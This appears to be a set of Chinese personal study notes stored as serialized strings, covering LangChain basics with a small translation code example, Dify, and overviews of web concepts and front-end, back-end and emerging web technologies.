构建具有记忆和上下文理解能力的应用\n- 创建能动态决策和使用工具的智能代理\n- 部署和监控生产级 AI 应用\n\nLangChain 的模块化设计允许开发者根据具体需求选择和组合不同的组件，从而构建出灵活且强大的 AI 应用。\n\n## 4. 开发时的语言选择建议\n\n- 如果你的项目主要涉及数据处理、复杂的 AI 模型集成或后端服务，选择 Python 版本可能更合适。\n- 如果你正在构建 Web 应用、需要前端集成或希望在浏览器中运行 LLM 应用，JavaScript 版本可能是更好的选择。\n- 对于全栈应用，你甚至可以考虑在后端使用 Python 版本，前端使用 JavaScript 版本，以充分利用两者的优势\n\n","tLAmqnjA":"\n# LangChain 概述\n\n`#2024/09/13` `#langchain`  `#agi/langchain`\n\n\n## 目录\n<!-- toc -->\n ## 1. 前置知识点  \n\n- 基本来说，各大厂大模型发布的时间，都在 2023 年上半年\n\t- 腾讯：混元\n- ChatGPT 需要分成两部分\n\t- GPT\n\t- Chat 是一种对话的方式，即针对对话应用\n- 通用的**提示词模板**：\n\t- 定义角色 +  背景信息 + 任务目标 + 输出要求\n- Token\n\t- 类似于字符是编程语言的最小单位\n\t- Token 大模型的基本单位\n\t\t- 英语中的一个简单句子可能会被拆分成多个标记\n\t\t- 而中文由于字符的特性，通常一个字符就是一个标记\n- 模型支持的上下文长度\n\t- 8k：8000 个标记（token） × 0.75 ≈ 6000 个英文单词\n\t\t- 注意：标点符号、特殊符号，数字等等都会影响 token 数量\n\t-  GPT-4 Turbo：支持最多 128,000 个 token\n\t- GPT-4：有两个版本\n\t    - 8K 版本：支持最多 8,192 个 token\n\t    - 32K 版本：支持最多 32,768 个 token\n- 大模型幻觉\n\t- 大模型的“幻觉”是指它们在缺乏理解能力的情况下生成不准确或虚假的信息。\n\t- 本质源于其基于统计学习的生成机制，缺乏事实验证和真正的理解能力\n- 大模型预训练与微调\n\t- **预训练**：在大规模通用数据集上训练模型，学习语言的广泛模式和结构。\n\t- **微调**：在特定任务的数据上进一步训练，以适应特定应用需求。\n\n## 2. LangChain 简介\n\n- 定义：是大模型的**编程框架**\n\t- 连接 开发者 和复杂的 LLM 应用\n- LangChain 提供开发过程中的一序列工具（百宝箱），比如\n\t- **SQL提示词模板**，方便查询\n- 组件与链\n\t- 组件：具有明确功能和用途的单元\n\t- 链：链定义了**组件的调用序列** \n\t- 例子：问“今天天气如何？同事告诉我量子力学是什么？”\n\t\t- `链`会**确保**调用 `搜索工具组件` 和 `维基百科组件` \n- Langchain 的应用场景\n\t- 数据查询和分析：LangChain 可以与数据库集成，允许用**自然语言**进行复杂的数据查询和分析\n\t- 代码生成理解\n\t- 自动问答机器人\n\n\n## LangChain 的 6 大模块\n\n- 模型 I/O\n\t- 不提供大模型，而是提供各大模型的统一接口\n- 数据增强：\n\t- 能够有效地补充LLM的知识库，解决其知识更新滞后的问题 \n\t- LangChain 的数据增强模块也被称为 LEDVR 工作流，这是一个多功能的数据增强集成工具。LEDVR 代表：\n\t\t- L: Loader (加载器)\n\t\t- E: Text Embedding Model (嵌入模型包装器)\n\t\t- D: Document Transformer (文档转换器)\n\t\t- V: Vector Store (向量存储)\n\t\t- R: Retriever (检索器)\n- 链\n\t- 多个 LLM 模型和其他多个组件进行连接\n- 记忆\n\t- 链会读取和写入数据到记忆中\n\t- 又分为短期记忆和长期记忆\n\t\t- 短期记忆主要用于处理最近的对话\n\t\t- 而长期记忆则帮助系统从历史记录中提取有用的信息，以便在对话中提供更丰富的上下文支\n- 代理（Agents）：强调动态、智能\n\t- 功能：实现动态决策和工具使用。\n\t- 类型：\n\t\t- 自我提问代理（Self-ask agent）：能够提出和回答自己的问题。\n\t\t- 计划和执行代理（Plan and execute agent）：制定计划并执行任务。\n\t\t- **ReAct** 代理：结合推理和行动。\n- 回调处理器（Callback）\n\t- 对各个阶段干预\n\n## LangChain 的开发流程\n\n###  获取 open ai key\n\n- 淘宝买吧，使用 `gpt-4o-mini`  最经济实惠\n- 秘钥保存，记得别提交了\n\n### 第一个程序：让 OpenAI 帮忙翻译\n\n```python\n# 导入 os 模块, 用于设置环境变量，但已经将环境变量设置到了 .zshrc 中了\n# 所以这里不需要导入 os 模块\n# import os\n\n# 从 langchain_openai 模块中导入 ChatOpenAI\nfrom langchain_openai import ChatOpenAI\nfrom langchain_text_splitters import python\nmodel = ChatOpenAI(model='gpt-4o-mini')\n\n# 导入用于构建对话消息的\nfrom langchain_core.messages import HumanMessage, SystemMessage\nmessages = [\n    # 设置系统指令，要求模型将英语翻译成意大利语\n    SystemMessage(content=\"Translate the following from English into chinese\"),\n    # 设置人类消息，内容为 \"hi!\"\n    HumanMessage(content=\"hi!\"),\n]\n\n# 使用之前创建的模型实例，调用 invoke 方法，传入消息列表\nres = model.invoke(messages)\n\nprint(res);\n\n# 输出结果如下：\n\"\"\"\n{\n    \"content\": \"你好！\",\n    \"additional_kwargs\": {\n        \"refusal\": None\n    },\n    \"response_metadata\": {\n        \"token_usage\": {\n            \"completion_tokens\": 2,\n            \"prompt_tokens\": 20,\n            \"total_tokens\": 22,\n            \"completion_tokens_details\": {\n                \"reasoning_tokens\": 0\n            }\n        },\n        \"model_name\": \"gpt-4o-mini-2024-07-18\",\n        \"system_fingerprint\": \"fp_483d39d857\",\n        \"finish_reason\": \"stop\",\n        \"logprobs\": None\n    },\n    \"id\": \"run-a72df3a8-7229-44cc-86c7-3c555f40ef20-0\",\n    \"usage_metadata\": {\n        \"input_tokens\": 20,\n        \"output_tokens\": 2,\n        \"total_tokens\": 22\n    }\n}\n\"\"\"\n\n```\n\n\n## 3. 参考\n\n- 《LangChain  入门指南 · 构建高可复用、可扩展的 LLM 应用程序》","y2s8RSvZ":"\n# Dify notes\n\n\n- langChain 与 Dify 的区别：\n\t- 可以把 LangChain 这类的开发库（Library）想象为有着锤子、钉子的工具箱。\n\t- 与之相比，Dify 提供了更接近生产需要的完整方案，Dify 好比是一套脚手架，并且经过了精良的工程设计和软件测试\n- 只要有优秀的文档，所有公司都可以打造出专用型问答机器人。\n- Dify 是一个开源的 LLMOps（大型语言模型运维）平台\n\n\n\n","cipzcsUT":"\n# 前言\n\n`#前端` \n\n>  前端相关\n\n","Egcuu3Gl":"\n# 前言\n\n\n`#前端` \n\n- 现代 Web 技术概述\n- 列举前端技术关键词\n\n\n\n","OSspbcOk":"\n# 互联网\n\n\n`#前端` `#互联网`  \n\n- 解释一：\n\t- 互联网（Internet）是一个全球性的计算机网络系统，通过一系列`标准化的通信协议（如 TCP/IP 等）`将世界各地的计算设备连接在一起。它允许用户在全球范围内共享和访问信息、资源和服务。\n- 解释二：\n\t- 互联网是一个通过`标准化通信协议`将全球计算设备连接在一起的网络系统，具有信息共享、电子邮件、在线搜索、社交媒体、电子商务和云计算等多种功能\n","9UpMS8xz":"\n# 万维网（World Wide Web）\n\n\n`#前端` `#互联网` `#R2`\n\n- 一般称其为 `WWW`、`W3` 或 `the Web` 或 `Web` \n- 是一个基于`超文本和多媒体技术`的全球信息空间。它允许用户通过互联网访问和共享文本、图像、视频和其他形式的信息\n- 它经历以下三个阶段\n   - Web 1.0：早期的静态网页，主要用于信息展示。\n   - Web 2.0：引入用户生成内容和交互功能，如博客、社交媒体、维基等。\n   - Web 3.0：也称为语义网，旨在通过机器学习和人工智能提高信息的关联性和可用性\n\n> Web 与互联网不一样：Web 是建立在互联网之上的许多应用程序之一\n\n","NQvdNTqc":"\n# Web 应用（Web Application）\n\n\n`#前端` \n\n是一种通过 `web 浏览器`访问的应用程序。它利用 `Web 技术`和标准来执行任务，通常包括与用户交互、数据处理和存储等功能，用户可以通过浏览器访问，无需下载或安装。它通常采用`客户端（浏览器）-服务器架构（即B/S架构）`，客户端是用户的浏览器，服务器是提供应用逻辑和数据存储的远程计算机。\n\n**特点：**\n\n- 浏览器访问，无需额外下载或安装软件\n- 动态内容：根据用户输入可显示不同内容\n- 交互性：\n\t- javascript 来支持\n- 跨平台：因为浏览器而跨平台，支持不同操作系统和设备（如 PC、手机、平板）\n\n![image.png](https://832-1310531898.cos.ap-beijing.myqcloud.com/yuque/34cffa574854ba3eac6cd1e59a715885.png)\n","R4cZUmmJ":"\n# 前端相关的技术点\n\n\n`#前端` \n\n> 以下是一些`相对不过时的前端技术关键词`及其简要介绍\n\n\n## 目录\n<!-- toc -->\n ## 1. React 和 React Hooks \n\n- **React**：\n\t- 一个由 Facebook 开发的用于构建用户界面的 JavaScript 库。它的虚拟 DOM 和组件化设计使其非常受欢迎。\n- **React Hooks**：\n\t- React 16.8 引入的一组新特性，允许在函数组件中使用状态和其他 React 特性\n\t\t- 如 `useState`、`useEffect` 等。\n\n## 2. Vue 3\n\n- **Vue.js**：一个用于构建用户界面的渐进式 JavaScript 框架。\n\t- Vue 3 引入了 Composition API、性能改进和更好的 TypeScript 支持。\n\n## 3. Svelte 和 SvelteKit\n\n- `Svelte`：一个新的前端框架，与传统框架不同\n- **Svelte 在编译时将组件转换为高效的命令式代码，而不是在运行时解释代码**。\n\t- Svelte 是一种全新的构建用户界面的方法。\n\t\t- 传统框架如 React 和 Vue 在浏览器中需要做大量的工作\n\t\t- 而 Svelte 将这些工作放到构建应用程序的**编译阶段**来处理\n\t- Svelte 在 `构建/编译阶段` 将你的应用程序转换为理想的 JavaScript 应用\n\t\t- 而不是在`运行阶段` 解释应用程序的代码\n\t\t- 这意味着你不需要为框架所消耗的性能付出成本，并且在应用程序首次加载时没有额外损失\n- `SvelteKit`：\n\t- 一个用于构建 `Svelte` 应用的全栈框架，支持服务器端渲染、静态站点生成等功能\n\n## 4. Next.js 和 Nuxt.js\n\n- **Next.js**：\n\t- 一个基于 `React` 的框架（元框架）\n\t- 支持服务器端渲染（SSR）、静态站点生成（`SSG`）和增量静态再生（`ISR`）。\n- **Nuxt.js**：\n\t- 一个基于 `Vue.js` 的框架，提供类似的功能，如 SSR 和 SSG。\n\n## 5. JAMstack\n\n- **JAMstack**：\n\t- 一种现代 Web 开发架构，强调使用 JavaScript、API 和 Markup。\n\t- 常用工具包括**静态站点生成器**（如 Gatsby、Next.js）和无服务器函数（如 Netlify Functions）。\n\n> 后文会详细说明 [8. JAMstack 架构](/post/beBNemRn.html)\n\n## 6. WebAssembly (Wasm)\n\n- **WebAssembly**：\n\t- 一种新的==二进制指令格式==，设计用于在浏览器中实现高性能应用。\n\t- 它允许开发者使用多种编程语言（如 C、C++、Rust）编写代码，并在浏览器中运行。\n\n## 7. TypeScript\n\n- **TypeScript**：微软开发的一种 JavaScript 的超集，增加了类型检查和其他特性\n\t- TypeScript 近年来在前端开发中变得非常流行，尤其是在大型项目中。\n\n## 8. GraphQL\n\n- **GraphQL**：\n\t- 由 Facebook 开发的一种用于 API 的查询语言，允许客户端指定所需的数据结构\n\t- 与传统的 REST API 相比，GraphQL 提供了更高效的数据获取方式\n\n## 9. Tailwind CSS\n\n- **Tailwind CSS**：\n\t- 一个实用优先的 CSS 框架，允许开发者直接在 HTML 中使用类名来应用样式。\n\t- 它的灵活性和可定制性使其在前端开发中越来越受欢迎。\n\n> 有点类似于之前的 `bootstrap`\n> 基于大模型要求 token 限制，其实大模型 与 Tailwind CSS 友好度更好\n\n## 10. Headless CMS \n\n> 有点类似于 BFF\n\n- **Headless CMS**：\n\t- Headless CMS 是一个后端内容管理系统，它将内容管理（\"后端\"）与内容展示（\"前端\"）完全分离。\n\t- 与传统的 CMS 不同，Headless CMS **只负责内容的存储和管理，不负责内容的展示方式**。\n\t- 常见的 Headless CMS 有 Contentful、Strapi 和 Sanity。\n\n![图片&文件](./files/20241115-1.png)\n\n## 11. Progressive Web Apps (PWA)\n\n- **PWA**：\n\t- 渐进式 Web 应用，通过使用现代 Web 技术（如 `Service Worker` 和 `Web App Manifest`）提供类似本地应用的体验，包括`离线访问`和`推送通知`\n\n## 12. 微前端：Micro Frontends \n\n- **Micro Frontends**：\n\t- 一种将前端应用拆分为多个小型、独立的模块的架构\n\t- 每个模块可以独立开发、部署和运行\n\n## 13. Web Components\n\n- **Web Components**：\n\t- 一组标准技术，允许开发者创建可重用的自定义 HTML 元素\n\t- 包括 Custom Elements、Shadow DOM 和 HTML Templates\n\n## 14. Server-side Rendering (SSR) 和 Static Site Generation (SSG)\n\n- **SSR** 和 **SSG**：\n\t- 通过在服务器端生成 HTML，提高了页面加载速度和 SEO 性能。\n\t\t- Next.js 和 Nuxt.js 都支持这些功能\n\n## 15. Modern Build Tools\n\n- **Webpack**、**Rollup**、**Parcel** 和 **Vite**：\n\t- 现代 JavaScript 构建工具，提供代码打包、模块化和性能优化等功能。\n\t- 更现代的，比如 ==esbuild ，rspack ，或者 turbopack==\n\n## 16. WebRTC\n\n- **WebRTC**：\n\t- 一种支持浏览器和移动应用进行实时通信（如视频、音频、数据传输）的技术。\n\t- 它使得开发者可以构建视频会议、实时聊天和 P2P 文件共享等应用。\n\n## 17. WebSockets\n\n- **WebSockets**：\n\t- 一种在客户端和服务器之间建立持久连接的协议，允许==双向通信==。\n\t- 适用于实时应用，如在线游戏、实时聊天和实时更新的仪表盘。\n\n## 18. SSE \n\n现在大模型应用经常会使用这个这种协议，本质也是 HTTP\n\n## 19. Service Workers\n\n- **Service Workers**\n\t- 一种在后台运行的脚本，能够拦截和处理网络请求，提供离线支持、缓存管理和推送通知等功能\n\t- 是 PWA 的核心技术之一\n\n## 20. Single Page Applications (SPA)\n\n- **SPA**：\n\t- 单页应用，通过动态加载内容和更新 URL 实现不重新加载整个页面的用户体验\n\t- 常用框架包括 React、Vue.js 和 Angular \n\n## 21. Microservices Architecture：微服务架构\n\n- **Microservices**：\n\t- 将应用拆分为一组小的、独立部署的服务，每个服务负责特定的业务功能\n\t- 前端可以通过 API 网关或服务编排与这些微服务进行交互\n\n## 22. APIs and Backend for Frontend (BFF)\n\n- **BFF**：\n\t- 一种设计模式，为每个前端应用（如 Web、移动）创建专门的后端服务，优化 API 调用和数据处理。\n\t- 是一种架构模式，在前端应用和后端服务之间添加一个中间层，专门用于服务特定的前端应用或客户端。\n\n![图片&文件](./files/20241115-2.png)\n\n## 23. 状态管理库：State Management Libraries\n\n> 用于数据流管理的\n\n- **Redux**：\n\t- 一个流行的 JavaScript 状态管理库，常与 React 一起使用\n- **MobX**：\n\t- 另一种状态管理库，基于`响应式编程`，适用于需要更灵活状态管理的应用\n- vuex\n- pinia\n\t- 响应式\n- umi / dva\n\n## 24. Component Libraries and Design Systems：组件库&设计系统\n\n- **Material-UI**：\n\t- 基于 Google 的 Material Design 规范的 React 组件库\n- **Ant Design**：\n\t- 一个企业级的 UI 设计语言和 React 组件库。\n- Element UI\n- 等等\n\n## 25. Serverless Architecture\n\n- **Serverless**：\n\t- 一种云计算模型，开发者只需编写代码而**无需管理服务器**。\n\t- 常用的服务包括 AWS Lambda、Azure Functions 和 Google Cloud Functions。\n- 国内各个云商也都有提供，比如腾讯云和阿里云\n\t- 个人用过的 亚马逊、腾讯云\n\n## 26. Static Site Generators (SSG)\n\nSSG 是一种将模板和数据转换为静态 HTML 网站的工具。它在**构建时（而不是运行时）生成所有页面**。\n\n![图片&文件](./files/20241115-3.png)\n\n常见的\n- vitepress：**自己常用的**\n\t- ![图片&文件](./files/20241115-5.png)\n- **Hugo**：\n\t- 一个用 Go 语言编写的静态站点生成器，构建速度非常快\n\t- 听过，没用过，一些网站都是用它来搭建的\n- rspack 也有类似的\n\n## 27. CSS-in-JS\n\n- **Styled Components**：\n\t- 一种将 CSS 直接写在 JavaScript 中的技术，提供组件级的样式隔离 \n- **Emotion**：\n\t- 一个高性能的 CSS-in-JS 库，支持标签模板和对象样式\n\n### 27.1. 它是如何做样式隔离的？\n\n1. **命名空间隔离**\n    - 通过生成唯一的类名或前缀\n    - 使用**哈希算法**确保唯一性\n    - 组件级别的样式封装\n2. **运行时隔离**\n    - 动态创建 style 标签\n    - 使用 Shadow DOM 提供原生隔离\n    - 样式注入时进行作用域限定\n3. **编译时转换**\n    - 在构建过程中转换类名\n    - 添加唯一标识符\n    - 生成隔离的样式代码\n\n## 28. Modern CSS Features\n\n- **CSS Grid**：\n\t- 一种用于创建二维布局的 CSS 布局系统。\n- **CSS Variables**：\n\t- 也称为自定义属性，允许定义可重用的值。\n- **Flexbox**：\n\t- 一种用于创建一维布局的 CSS 布局系统。\n\n## 29. Web Animations API\n\n- **Web Animations API**：\n\t- 一种用于在 Web 上创建高性能动画的 API，提供了对动画的精细控制。\n\n## 30. Web Components \n\n- **LitElement**：\n\t- 一个用于构建 Web Components 的轻量级库，简化了自定义元素的创建。\n- **Stencil**：\n\t- 一个用于构建高性能 Web Components 的编译器，支持 TypeScript 和 JSX。\n\n> 都没用过，现在市面完全使用 Web Components 还是较少\n\n## 31. Testing Frameworks and Tools\n\n- **Jest**：\n\t- 一个由 Facebook 开发的 JavaScript 测试框架，支持快照测试和并行测试\n- **Cypress**：\n\t- 一个用于端到端测试的现代 JavaScript 测试框架，提供了直观的 API 和强大的调试功能\n- **Playwright**：\n\t- 一个用于端到端测试的工具，由 Microsoft 开发，支持多种浏览器\n\n## 32. Web Vitals\n\n- **Web Vitals**：\n\t- 一组由 Google 定义的指标，用于衡量和优化 Web 性能，\n\t- 包括\n\t\t- Largest Contentful Paint (LCP)\n\t\t- First Input Delay (FID) \n\t\t- Cumulative Layout Shift (CLS)\n\n## 33. 边缘计算：Edge Computing\n\n- **Edge Computing**：\n\t- 一种在`靠近数据源的地方`进行计算和数据处理的技术，减少了延迟，提高了性能。\n\t- 常见的服务包括 Cloudflare Workers 和 AWS Lambda@Edge。\n\n## 34. Low-Code/No-Code Platforms\n\n- **Low-Code/No-Code**：\n\t- 一种通过图形化界面和拖放组件来构建应用的开发方式，降低了开发门槛\n\t- 常见平台包括 `Mendix` 和 `Webflow`\n\t- 国内各大云平台都有自己的低代码产品\n\n## 35. Remote Procedure Calls (RPC)\n\n- RPC：\n\t- 通过网络调用远程服务的方法\n\t- RPC 允许程序==调用另一个地址空间==（通常是网络上的另一台机器）的程序\n\t- 使程序能像调用本地方法一样调用远程服务\n\t- 适用于高性能的前后端通信。\n\t\t- ![图片&文件](./files/20241115-6.png)\n- **主要特点**\n\t- **透明性**：调用方感知不到远程调用的存在\n\t- **高效性**：通常比 REST API 更高效\n\t- **强类型**：通过 IDL 定义接口，提供类型安全\n\t- **双向通信**：支持请求-响应模式\n- **主流 RPC 框架**\n\t- gRPC (Google)\n\t- Dubbo (Apache/Alibaba)\n\t- `Thrift` (Apache) \n\t- Spring Cloud (VMware)\n\n## 36. Module Federation：模块联邦\n\n- Module Federation：\n\t- Webpack 5 的新特性，支持在不同应用之间动态加载模块，**适用于微前端架构**\n- vite 也有类似的功能点，\n\n## 37. 增量静态再生（Incremental Static Regeneration, ISR）\n\n- 增量静态再生（Incremental Static Regeneration, ISR）是 Next.js 提供的一种功能，\n- 结合了静态站点生成（Static Site Generation, SSG）和服务器端渲染（Server-Side Rendering, SSR）的优点。\n\t- 它允许开发者在`构建时`生成静态页面\n\t- 并在`运行时`**按需更新**这些页面，从而实现高性能和最新数据的平衡。\n- 但==不适合==高实时、更新频繁的页面\n\n![图片&文件](./files/20241226.png)\n\n## 38. Storybook\n\n- 介绍：\n\t- 用于 开发 和 测试UI组件 的工具\n- 特点：\n\t- 独立环境、组件文档、交互测试\n\n## 39. 参考\n\n- [GPT-4o](https://chatgpt.com/)\n- [Claude 3.5 Sonnet](https://www.anthropic.com/news/claude-3-5-sonnet?locale=zh_CN)\n- [web 入门 - 学习 Web 开发 | MDN](https://developer.mozilla.org/zh-CN/docs/Learn/Getting_started_with_the_web)\n- [Web 和 Web 标准 - 学习 Web 开发 | MDN](https://developer.mozilla.org/zh-CN/docs/Learn/Getting_started_with_the_web/The_web_and_web_standards)\n- [万维网 - MDN Web 文档术语表：Web 相关术语的定义 | MDN](https://developer.mozilla.org/zh-CN/docs/Glossary/World_Wide_Web)\n- [万维网是如何工作的 - 学习 Web 开发 | MDN](https://developer.mozilla.org/zh-CN/docs/Learn/Getting_started_with_the_web/How_the_Web_works)\n- [什么是 JAMstack？](https://www.cloudflare.com/zh-cn/learning/performance/what-is-jamstack/)\n- [什么是JAMStack前端架构](https://juejin.cn/post/6999897855695683614)\n- [前端知识图谱](https://f2e.tech/mindmap?)\n\n","MeuJKqMc":"\n# 现代 Web 技术现状\n\n\n`#前端` \n\n\n## 目录\n<!-- toc -->\n ## 1. 当前前端技术现状 \n\n> 当前的技术状态\n\n- **单页应用（SPA）**：\n\t- 单页应用通过动态加载内容，使用户体验更加流畅。常用框架有 React、Angular 和 Vue.js。\n\t- 使用`虚拟 DOM 技术`，提高了性能和响应速度。\n\t\t- 正在`无虚拟 DOM 化`\n- **渐进式 Web 应用（PWA）**：\n\t- **PWA** 结合了 Web 应用和本地应用的优点，提供离线访问、推送通知和安装到主屏幕等功能，使 Web 应用具有更好的性能和用户体验。\n\t- 通过` Service Worker` 实现离线缓存和后台同步。\n\t- 其实这几年不怎么提了\n- **Web 组件**：\n\t- Web 组件是一种封装 HTML、CSS 和 JavaScript 的技术，允许开发者创建`可重用的自定义元素`。\n\t- 标准技术包括 `Custom Elements`、`Shadow DOM` 和 `HTML Templates`。\n- **CSS-in-JS**：\n\t- 将 CSS 样式直接写在 JavaScript 中，方便样式的动态生成和管理。\n\t- 常用库有 `styled-components` 和 `Emotion`。\n\n## 2. 后端技术的演变\n\n- **无服务器架构（Serverless Architecture）**：\n\t- 开发者可以将代码部署到云服务提供商（如 AWS Lambda、Azure Functions），无需管理服务器。\n\t- ==按需收费==，自动扩展，适合事件驱动的应用程序。\n\t\t- 按使用量收费\n- **微服务架构**：\n\t- 将大型应用拆分为多个小型、独立的服务，每个服务负责单一功能\n\t- 提高了应用的可扩展性和维护性\n\t\t- 常用技术包括 `Docker` 和 `Kubernetes （k8s）`\n- **GraphQL**：\n\t- 由 Facebook 开发的一种查询语言，允许客户端指定所需的数据结构\n\t- 减少了冗余数据传输，提高了数据获取的灵活性和效率\n\n## 3. DevOps 和 CI/CD\n\n- **持续集成和持续部署（CI/CD）**：\n\t- 自动化代码测试、构建和部署流程，提高了开发效率和代码质量。\n\t- 常用工具有` Jenkins`、`GitHub Actions`、`GitLab CI/CD`。\n- **容器化和编排**：\n\t- 使用 `Docker` 将应用打包成独立的容器，确保在不同环境中的一致性。\n\t- 使用 `Kubernetes` 管理和编排容器，提供自动扩展、负载均衡和故障恢复。\n\n## 4. 安全和性能优化\n\n- **内容安全策略（CSP）**：\n\t- 通过设置 HTTP 头，防止跨站脚本攻击（XSS）和 数据注入攻击\n\t- 限制资源加载的来源，提高应用的安全性\n- **HTTP/2 和 HTTP/3**：\n\t- HTTP/2 提供多路复用、头部压缩和**服务器推送**，显著提高了 Web 性能\n\t- HTTP/3 基于 `QUIC 协议`，进一步减少了延迟和提高了传输效率。\n\t\t- QUIC (Quick UDP Internet Connections)\n- **Web 性能优化**：\n\t- 使用懒加载（Lazy Loading）和代码分割（Code Splitting）减少初始加载时间\n\t- 通过使用 CDN（内容分发网络）加速资源传输\n\n## 5. 新兴技术和标准\n\n- **WebAssembly (Wasm)**：\n\t- 一种新的==二进制指令格式==，允许开发者用 C、C++、Rust 等语言编写高性能的 Web 应用。\n\t- 提高了 Web 应用的计算性能，适用于游戏、图像处理等高性能需求的应用。\n- **WebXR**：\n\t- 用于构建虚拟现实（VR）和增强现实（AR）应用的标准 API。\n\t- 提供了在 Web 浏览器中体验沉浸式内容的能力。\n- **机器学习和 AI**：\n\t- `TensorFlow.js` 和 `ml5.js` 等库使得在浏览器中进行机器学习和人工智能应用成为可能。\n\t- 实现图像识别、自然语言处理等功能，增强用户体验\n\t- **端侧推理，与端侧智能**\n\n> 下文还有详细介绍\n\n## 6. 用户体验和设计\n\n- **响应式设计**：\n\t- 使用媒体查询和弹性布局，使网页在不同设备上都有良好的显示效果。\n\t- 提高了移动设备用户的体验。\n- **无障碍设计**：\n\t- 确保 Web 应用对所有用户，包括残障人士，都具有可访问性\n\t- 遵循 WAI-ARIA 标准，提供语义化的 HTML 标签和辅助功能\n\n\n","FqbwTpiV":"\n# Web 技术概述\n\n\n`#前端` \n\n`Web 技术`是用于创建和维护 Web 应用、网站和 Web 服务的一组技术和标准\n\n\n## 目录\n<!-- toc -->\n ## 1. 前端技术 \n\n前端技术主要用于构建用户界面和用户体验，涉及到网页的结构、样式和交互功能。\n\n- **HTML (HyperText Markup Language)**：\n\t- 用于定义网页的结构和内容。\n\t- HTML 标签用于标记文本、图像、链接等元素。\n- **CSS (Cascading Style Sheets)**：\n\t- 用于控制网页的外观和布局。\n\t- 通过样式规则定义元素的颜色、字体、排版等。\n- **JavaScript**：\n\t- 一种脚本语言，用于实现网页的动态功能和交互效果。\n\t- 可以操作 HTML 和 CSS，实现动画、表单验证、动态内容加载等功能。\n- **前端框架和库**：\n\t- **React**：由 Facebook 开发的 JavaScript 库，用于构建用户界面。\n\t- **Angular**：由 Google 开发的前端框架，用于构建复杂的单页应用。\n\t- **Vue.js**：一个渐进式 JavaScript 框架，易于集成和使用。\n- **AJAX (Asynchronous JavaScript and XML)**：\n\t- 用于在不重新加载整个页面的情况下与服务器进行异步数据交换。\n\t- 常用于动态内容更新和后台数据加载。\n- Fetch\n- 等等。。。\n\n> 后面章节都会展开\n\n## 2. 后端技术\n\n后端技术主要用于处理业务逻辑、数据存储和服务器端的操作。\n\n1. **服务器端编程语言**：\n\t- **Node.js**：基于 JavaScript 的服务器端运行环境，适用于构建高性能网络应用。\n\t- **Python**：常用于 Web 开发的语言，框架如 Django 和 Flask。\n\t\t- FastAPI\n\t- **Ruby**：用于 Web 开发的语言，框架如 Ruby on Rails。\n\t- **PHP**：广泛应用于 Web 开发的语言，特别是内容管理系统（如 WordPress）。\n\t- Java\n\t- Golang \n\t- 等\n2. **数据库**：\n\t- **关系型数据库**：如 MySQL、PostgreSQL，使用 SQL 进行数据查询和操作。\n\t- **NoSQL 数据库**：如 MongoDB、Cassandra，适用于处理大规模和==非结构化数据==。\n3. **Web 框架**：\n\t- 提供结构化的开发环境和工具，简化 Web 应用的开发过程。\n\t- 常见的框架如 Express (Node.js)、Django (Python)、Rails (Ruby)。\n4. **API (Application Programming Interface)**：\n\t- 用于客户端和服务器之间的数据交换。\n\t- 常见的 API 形式有\n\t\t- RESTful API \n\t\t- GraphQL。\n\t\t- APIJSON\n\t\t- RPC\n\t\t\t- Thrift \n\t\t\t- gRpc\n\t\t\t- 等等\n\n## 3. 协议和标准\n\n1. **HTTP/HTTPS (HyperText Transfer Protocol / Secure)**：\n\t- 用于在浏览器和服务器之间传输数据\n\t- HTTPS 是 HTTP 的安全版本，使用 SSL/TLS 加密数据传输\n2. **WebSocket**：\n\t- 一种全双工通信协议，允许客户端和服务器之间的实时数据交换。\n\t- 常用于实时聊天、在线游戏等应用。\n3. **REST (Representational State Transfer)**：\n\t- 一种架构风格，用于设计网络应用的 API。\n\t- 基于 HTTP 协议，使用标准的 HTTP 方法（如 GET、POST、PUT、DELETE）。\n4. **GraphQL**：\n\t- 由 Facebook 开发的一种查询语言，用于 API 数据查询。\n\t- 允许客户端指定所需的数据结构，减少冗余数据传输。\n- RPC \n- SSE \n\n## 4. 开发工具套件和环境\n\n1. **版本控制系统**：\n\t- **Git**：用于跟踪代码变更和协作开发的版本控制系统。\n\t- **GitHub/GitLab**：基于 Git 的代码托管平台，提供协作和项目管理工具。\n2. **集成开发环境（IDE）和代码编辑器**：\n\t- **WebStorm**：\n\t\t- 专为 Web 开发设计的 IDE，提供强大的代码编辑和调试功能。\n\t- **Visual Studio Code**：\n\t\t- 流行的代码编辑器，支持多种编程语言和扩展。\n3. **构建工具和包管理器**：\n\t- **Webpack**：\n\t\t- 用于打包 JavaScript 模块和资源的构建工具。\n\t- **npm/yarn/pnpm**：\n\t\t- JavaScript 包管理器，用于管理项目依赖。\n\n","h04lgIdB":"\n# Web 新兴技术\n\n\n`#前端` \n\n\n## 目录\n<!-- toc -->\n ## 1. WebAssembly (Wasm) \n\n### 1.1. 定义\n\n- WebAssembly 是一种新的==二进制指令格式==，设计用于浏览器中的高性能执行。\n- 它是一种低级、==类似于汇编语言==的格式，可以与 JavaScript 一起使用。\n\n### 1.2. 特点\n\n- **高性能**：接近原生代码的执行速度，适用于需要高计算性能的应用。\n- **跨平台**：在不同的操作系统和设备上运行一致。\n- **语言无关**：支持多种编程语言，如 C、C++、Rust 等。\n\n### 1.3. 应用场景\n\n- **游戏开发**：高性能的图形渲染和计算。\n- **图像和视频处理**：实时的图像编辑和视频编码。\n- **科学计算**：复杂的数学运算和模拟。\n\n## 2. WebXR\n\n### 2.1. 定义\n\nWebXR 是一种用于构建虚拟现实（VR）和增强现实（AR）体验的标准 API。它是 WebVR 的扩展，提供了更广泛的功能和更好的性能。\n\n### 2.2. 特点\n\n- **跨设备支持**：\n\t- 支持多种 VR 和 AR 设备，如 Oculus Rift、HTC Vive、Microsoft HoloLens 等。\n- **高性能**：\n\t- 优化了渲染和交互的性能，提供沉浸式体验。\n- **易于集成**：\n\t- 与现有的 Web 技术（如 WebGL）无缝集成。\n\n### 2.3. 应用场景\n\n- **游戏和娱乐**：沉浸式游戏和虚拟旅游。\n- **教育和培训**：虚拟实验室和模拟训练。\n- **电商和营销**：虚拟试衣间和产品展示。\n\n## 3. 机器学习和 AI \n\n### 3.1. TensorFlow.js 和 ml5.js\n\n- **TensorFlow.js**：\n\t- 一个用于在浏览器中运行机器学习模型的库。支持训练和推理，允许开发者直接在客户端进行机器学习操作。\n- **ml5.js**：\n\t- 基于 TensorFlow.js 的高级库，提供了简单易用的 API，用于实现常见的机器学习任务。\n\n### 3.2. 特点\n\n- **实时处理**：在浏览器中实时运行机器学习模型，无需服务器端处理。` ===> 端侧模型`\n- **隐私保护**：数据在本地处理，减少了隐私泄露的风险。\n- 